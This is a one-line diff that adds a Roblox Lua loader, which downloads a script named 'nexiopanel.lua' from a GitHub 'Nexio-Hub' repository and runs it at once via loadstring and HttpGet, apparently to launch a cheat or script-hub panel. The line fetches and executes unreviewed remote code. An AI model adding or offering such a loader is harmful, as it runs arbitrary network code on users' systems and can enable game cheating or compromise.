@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/alejandroacevedo1028-crypto/Nexio-Hub/main/scripts/nexiopanel.lua"))()
